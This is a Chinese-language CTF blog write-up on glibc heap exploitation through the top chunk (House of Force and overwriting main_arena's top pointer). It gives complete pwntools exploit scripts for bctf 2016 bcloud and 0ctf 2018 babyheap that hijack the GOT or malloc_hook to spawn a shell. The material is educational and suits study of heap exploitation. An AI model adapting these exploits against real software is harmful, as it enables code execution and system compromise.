---
title: Top Chunk利用
date: 2019-04-21 10:58:07
tags: pwn
---

本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。

## House of force（Top chunk劫持）

### top chunk的分割机制与利用点

众所周知，top chunk的作用是作为后备堆空间，在各bin中没有chunk可提供时，分割出一个chunk提供给用户。那么这个分割过程是怎样的呢？我们来看一份源码：

```c
victim = av->top;
size   = chunksize(victim);
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) //检查请求size是否可以分配
{
    remainder_size = size - nb; // 分配后size，此处nb为有符号数
    remainder      = chunk_at_offset(victim, nb); // 分配后指针
    av->top        = remainder; // top = 分配后的指针
    set_head(victim, nb | PREV_INUSE | // 设置PREV_INUSE和NON_MAIN_ARENA
            (av != &main_arena ? NON_MAIN_ARENA : 0)); 
    set_head(remainder, remainder_size | PREV_INUSE); //设置top

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了

试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。

一般来说，pwn中劫持控制流常常取malloc_hook, got表等指针，与堆空间中的top chunk相聚甚远，远到所需要申请的size必定超过top chunk现有的大小，无法控制if条件的检查。

但是，我们看到if条件检查时size被强制转换为unsigned long，所以如果我们将size溢出覆盖为0xffffffff（-1），那么我们可以任意申请。此外，虽然此处的检查中，用户申请的大小也被当作无符号整数对待，但是在后面推top chunk的时候是以int对待的，所以可以劫持到低地址，加负数。

### 利用条件

- 用户可以修改top chunk的size字段
- 用户可以申请任意大小的堆内存（包括负数）


<!-- more -->

## bctf 2016 bcloud

### 防护

```
liwc@ubuntu:~/pwn/pwn/heap/house-of-force/2016_bctf_bcloud$ checksec bcloud
[*] '/home/liwc/pwn/pwn/heap/house-of-force/2016_bctf_bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

没有开启PIE，RELRO也只开了一部分，所以可以劫持got表，同时注意是一道32位的题。

### 分析

main函数一开始在设置缓冲区之后，会调用init_bloud函数，首先要求输入名字，然后malloc(0x40)，将指针放在bss段上的name处，然后输出name中的数据。

然后会调用init_org_host函数，输入org和host，都放在bss段上。

#### init_org_host

```c
unsigned int init_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u); // chunkptr1
  v2 = (char *)malloc(0x40u); // chunkptr2
  org = v2;
  host = v4;
  strcpy(v4, &v3);// 从v3地址起复制
  strcpy(v2, &s); // 从s地址起复制到v2，越界。
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

首先向栈中s处开始写0x40，然后向v3处写0x40，如果都写满0x40个字节，在malloc v4和v2的时候，会把那一个\x00覆盖掉，导致从栈中s处copy栈上数据一直到v3的填充结束。这里是典型的由于strcpy函数的不安全性导致的错误。

#### read_str

这里read_str函数中存在漏洞

```c
int __cdecl read_str(char *s, int len, char stop)
{
  char buf; // [esp+1Bh] [ebp-Dh]
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i < len; ++i )
  {
    if ( read(0, &buf, 1u) <= 0 )
      exit(-1);
    if ( buf == stop )
      break;
    s[i] = buf;
  }
  s[i] = 0;
  return i;
}
```

当碰到\n时会停止循环，如果读入完整长度，最后会多覆盖一个\x00。

#### new_note

通过bss段上的notelist全局数组管理堆块，每次malloc输入的size+4，size存在notesize上，然后读入内容，最后把相应的issync数组项置为0。

#### show_note

假的，无法使用。

#### edit_note

输入id，从notelist上取出相应chunk的指针，然后将对应id的issync置为0，最后根据存储的size进行edit

#### delete_note

输入id，将notelist和notesize全部置为0，再free。

#### syn

将issync前十位都置为1。

### 利用

#### leak heap

只要在输入name时输入0x40的数据即可泄漏出heap地址，因为堆块内存和堆块地址在栈上相邻。

#### 修改top chunk的size

调试得到top chunk的size会被org的前4个byte覆盖。

```
gef➤  heap chunks
Chunk(addr=0x8178008, size=0x48, flags=PREV_INUSE)
    [0x08178008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x8178050, size=0x48, flags=PREV_INUSE)
    [0x08178050     63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63    cccccccccccccccc]
Chunk(addr=0x8178098, size=0x48, flags=PREV_INUSE)
    [0x08178098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]
Chunk(addr=0x81780e0, size=0x63636360, flags=PREV_INUSE|IS_MMAPPED)  ←  top chunk

gef➤  x/64x 0x08178050
0x8178050:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178060:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178070:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178080:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178090:	0x00000000	0x00000049	0x62626262	0x62626262
0x81780a0:	0x62626262	0x62626262	0x62626262	0x62626262
0x81780b0:	0x62626262	0x62626262	0x62626262	0x62626262
0x81780c0:	0x62626262	0x62626262	0x62626262	0x62626262
0x81780d0:	0x62626262	0x62626262	0x08178098	0x63636363
0x81780e0:	0x63636363	0x63636363	0x63636363	0x63636363
0x81780f0:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178100:	0x63636363	0x63636363	0x63636363	0x63636363
0x8178110:	0x63636363	0x63636363	0x63636363	0x00000000
0x8178120:	0x00000000	0x00000000	0x00000000	0x00000000
0x8178130:	0x00000000	0x00000000	0x00000000	0x00000000
0x8178140:	0x00000000	0x00000000	0x00000000	0x00000000

```

exp如下：

```python
p.recvuntil("Org:\n")
p.send("b" * 0x40)
p.recvuntil("Host:\n")
p.sendline(p32(0xffffffff) + "c" * 0x3c)
```

结果如下：

```
gef➤  heap chunks
Chunk(addr=0x877b008, size=0x48, flags=PREV_INUSE)
    [0x0877b008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x877b050, size=0x48, flags=PREV_INUSE)
    [0x0877b050     ff ff ff ff 63 63 63 63 63 63 63 63 63 63 63 63    ....cccccccccccc]
Chunk(addr=0x877b098, size=0x48, flags=PREV_INUSE)
    [0x0877b098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]
Chunk(addr=0x877b0e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk

```

所以就可以实现任意写了

#### leak libc

由于程序中没有leak的功能，我们要实现leak libc，需要劫持某个got表为最一开始打印用户名的函数，而且这个libc函数的参数还需要我们能控制，所以我们只能选择free函数。

因为程序是通过notelist管理chunk，所以只要我们劫持了notelist，也就可以实现任意地址读写。

所以我们将chunk分配到notelist之前，然后依次修改notelist上前几项为：

```
puts@got # 0
free@got # 1
&notelist[3] # 2
/bin # 3
/sh\x00 4
```

首先edit(1)，劫持free@got为info函数，然后delete(0)，即可leak出libc。

#### RCE

然后edit(1)，劫持free@got为system，最后delte(2)即可getshell。

### EXP

```python
from pwn import *
# from LibcSearcher import *

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./bcloud")
p = process("./bcloud")

def allocate(size, content):
	p.recvuntil(">>\n")
	p.sendline("1")
	p.recvuntil("note content:\n")
	p.sendline(str(size))
	p.recvuntil("the content:\n")
	p.send(content)
  
def allocate__(size):
	p.recvuntil(">>\n")
	p.sendline("1")
	p.recvuntil("note content:\n")
	p.sendline(str(size))
  
def update(index, content):
	p.recvuntil(">>\n")
	p.sendline("3")
	p.recvuntil("id:\n")
	p.sendline(str(index))
	p.recvuntil("content:\n")
	p.send(content)

def delete(index):
	p.recvuntil(">>\n")
	p.sendline("4")
	p.recvuntil("id:\n")
	p.sendline(str(index))

info = 0x8048779
notelist = 0x804b120

# leak heap
p.recvuntil("name:\n")
p.send("a" * 0x40)
heap_addr = u32(p.recvuntil("!")[-5:-1]) - 8

# change top chunk
p.recvuntil("Org:\n")
p.send("b" * 0x40)
p.recvuntil("Host:\n")
p.send(p32(0xffffffff) + "\n")

# malloc to notelist
offset = (notelist - 0x8) - (heap_addr + 0xd8) - 0x8
allocate__(offset) # 0

payload = p32(elf.got['puts']) #0
payload += p32(elf.got['free']) # 1
payload += p32(notelist + 0x4 * 3) # 2
payload += "/bin/sh\x00" # 3 4
allocate(len(payload), payload) # 1

update(1, p32(info) + "\n")
delete(0)
puts_got = u32(p.recvuntil("\xf7")[-4:])
libc.address = puts_got - libc.symbols['puts']
system = libc.symbols['system']
update(1, p32(system) + "\n")

delete(2)

p.interactive()

```

## 0ctf 2018 babyheap

### 防护

```
liwc@ubuntu:~/pwn/pwn/baby-heap-2018$ checksec babyheap
[*] '/home/liwc/pwn/pwn/baby-heap-2018/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

全防护

### 分析

#### allocate

​	最多16个chunk，size不大于0x58，每次calloc之后将list数组上对应位置的inuse置1，并存储size和chunkptr，但是并没有写入chunk的内容。

#### update

​	输入Index和一个size，然后如果输入的size小于等于原来的size+1，就可以以输入的size向堆上写，也就是这里存在off by one漏洞。

```c
int __fastcall update(element *list)
{
  unsigned __int64 oldSizePlus1; // rax
  signed int i; // [rsp+18h] [rbp-8h]
  int newsize; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  i = getlong();
  if ( i >= 0 && i <= 15 && list[i].inuse == 1 )
  {
    printf("Size: ");
    LODWORD(oldSizePlus1) = getlong();
    newsize = oldSizePlus1;
    if ( (signed int)oldSizePlus1 > 0 )
    {
      oldSizePlus1 = list[i].size + 1;
      if ( newsize <= oldSizePlus1 )
      {
        printf("Content: ");
        readN((char *)list[i].chunkptr, newsize);// off by one
        LODWORD(oldSizePlus1) = printf("Chunk %d Updated\n", (unsigned int)i);
      }
    }
  }
  else
  {
    LODWORD(oldSizePlus1) = puts("Invalid Index");
  }
  return oldSizePlus1;
}
```

#### delete

free掉对应chunk，并将数组上相应位置设置为NULL，不存在UAF。

#### view

根据inuse，show出chunk的内容。

### 利用

本题应该是构造overlapping，以实现信息泄漏和fastbin attack。

#### leak libc

溢出一个小chunk，改大下一个chunk的size位，然后free掉被修改的chunk，这时chunk将会被放到unsorted bin中，之后再malloc较小的size，即可从被分离后的last remainder处leak处main_arena地址

```python
# leak libc
allocate(0x18)
allocate(0x40)
allocate(0x40)
allocate(0x10)
payload = 0x18 * "a" + "\xa1"
update(0, len(payload), payload)
delete(1)
allocate(0x40)
view(2)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = addr - 0x3c4b78
```

#### 劫持控制流

按常规思路，我们只要能将chunk申请到malloc_hook之前的那个位置（即保证size为0x7f），然后修改malloc_hook为one_gadget即可，但是本题对申请的chunk的size进行限制，最大只能为0x60，所以不可能通过直接的fastbin attack修改fd从而申请到那个位置。这里，我们采用改main_arena中的top指针的方法，令下次分配从top指针指向的地址开始。

main_arena的结构如下：

```c
struct malloc_state {
    /* Serialize access.  */
    __libc_lock_define(, mutex);

    /* Flags (formerly in max_fast).  */
    int flags;

    /* Fastbins */
    mfastbinptr fastbinsY[ NFASTBINS ];

    /* Base of the topmost chunk -- not otherwise kept in a bin */
    mchunkptr top; // top chunk的地址

    /* The remainder from the most recent split of a small request */
    mchunkptr last_remainder;

    /* Normal bins packed as described above */
    mchunkptr bins[ NBINS * 2 - 2 ];

    /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/
    unsigned int binmap[ BINMAPSIZE ];

    /* Linked list, points to the next arena */
    struct malloc_state *next;

    /* Linked list for free arenas.  Access to this field is serialized
       by free_list_lock in arena.c.  */
    struct malloc_state *next_free;

    /* Number of threads attached to this arena.  0 if the arena is on
       the free list.  Access to this field is serialized by
       free_list_lock in arena.c.  */
    INTERNAL_SIZE_T attached_threads;

    /* Memory allocated from the system in this arena.  */
    INTERNAL_SIZE_T system_mem;
    INTERNAL_SIZE_T max_system_mem;
};

```

gdb调试：

```
gef➤  x/32gx 0x7f81fbc89b20
0x7f81fbc89b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7f81fbc89b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7f81fbc89b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7f81fbc89b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7f81fbc89b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7f81fbc89b70 <main_arena+80>:	0x0000000000000000	0x0000559b443720e0
0x7f81fbc89b80 <main_arena+96>:	0x0000559b44372070	0x0000559b44372070
0x7f81fbc89b90 <main_arena+112>:	0x0000559b44372070	0x00007f81fbc89b88
0x7f81fbc89ba0 <main_arena+128>:	0x00007f81fbc89b88	0x00007f81fbc89b98

gef➤  heap chunks
Chunk(addr=0x559b44372010, size=0x20, flags=PREV_INUSE)
    [0x0000559b44372010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x559b44372030, size=0x50, flags=PREV_INUSE)
    [0x0000559b44372030     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x559b44372080, size=0x50, flags=PREV_INUSE)
    [0x0000559b44372080     78 9b c8 fb 81 7f 00 00 78 9b c8 fb 81 7f 00 00    x.......x.......]
Chunk(addr=0x559b443720d0, size=0x20, flags=)
    [0x0000559b443720d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x559b443720f0, size=0x20f20, flags=PREV_INUSE)  ←  top chunk

```

所以main_arena + 88处存储的是top chunk的地址，尝试在这个地址前找一个合适的偏移。但是前面都是fastbin数组存储的fd指针，如果fastbin链表中没有chunk的话，就不可能有合适的偏移地址。所以要首先向fastbin 填充一些chunk的地址，这里有个trick，一般来说堆地址是0x55开头的（有时候是0x56），所以我们用fastbin在main_arena占位后，找到一个合适的偏移，使得size为0x55(0x56)，然后malloc(0x40)即可。这里是根据`(0x55 >> 4) - 2 =  4`计算得到chunk在fastbin中的下标。

```
gef➤  x/32gx 0x7f4b01358b78-0x58 + 0x20 + 5
0x7f4b01358b45 <main_arena+37>:	0xad249d50e0000000	0x0000000000000055
0x7f4b01358b55 <main_arena+53>:	0x0000000000000000	0x0000000000000000
0x7f4b01358b65 <main_arena+69>:	0x0000000000000000	0x0000000000000000
0x7f4b01358b75 <main_arena+85>:	0xad249d5140000000	0xad249d5070000055
0x7f4b01358b85 <main_arena+101>:	0x4b01358b78000055	0x4b01358b7800007f

```

可以看到，当分配到main_arena+0x20+5时，size为0x55，然后就可以覆盖top chunk或者last remainder了。

```
gef➤  heap bins
[+] No Tcache in this version of libc
────────────────────── Fastbins for arena 0x7fedf8a74b20 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x55f94d040080, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x7fedf8a74b55, size=0x50, flags=PREV_INUSE|NON_MAIN_ARENA) 
Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x55f94d0400f0, size=0x60, flags=PREV_INUSE) 
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00

```

​	当成功修改top指针后，再次malloc，会从top指针处开始任意分配，这时分配到malloc_hook之前即可，但仍然需要绕过对size的检查，所以我们令top chunk指向main_arena - 0x33的地址。

​	

​	但是，该题利用成功率不是百分之百，有一定几率失败。

### exp

```python
from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./babyheap")
p = process("./babyheap")

def allocate(size):
	p.recvuntil("Command: ")
	p.sendline("1")
	p.recvuntil("Size: ")
	p.sendline(str(size))

def update(index, size, content):
	p.recvuntil("Command: ")
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.send(content)

def view(index):
	p.recvuntil("Command: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))

def delete(index):
	p.recvuntil("Command: ")
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))

# leak libc
allocate(0x18) # 0 
allocate(0x40) # 1
allocate(0x40) # 2
allocate(0x10) # 3
payload = 0x18 * "a" + "\xa1"
update(0, len(payload), payload)
delete(1)
allocate(0x40) # 1
view(2)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = addr - 0x3c4b78
main_arena = addr - 0x58
one_gadget = libc.address + 0x4526a # f1147 4526a
print hex(addr)

chunk_addr = main_arena + 0x20 + 5
fake_addr = main_arena - 0x33
allocate(0x40) # 4
delete(2) # use 4 to write to truly 2


allocate(0x58) # 2 
delete(2) # 2

payload = p64(chunk_addr) + p64(0)
update(4,len(payload), payload) # change fd of truly idx2

allocate(0x40) # 2
allocate(0x40) # 5 at main_arena

payload = (0x58 - 0x30 - 5) * "\x00"
payload += p64(fake_addr)
update(5, len(payload), payload)

allocate(0x48) # 6
payload = 0x13 * "a"
payload += p64(one_gadget)
update(6, len(payload), payload)
allocate(0x10)
p.interactive()
```

# 参考链接：

<https://www.anquanke.com/post/id/175630>

<http://eternalsakura13.com/2018/04/03/babyheap/>

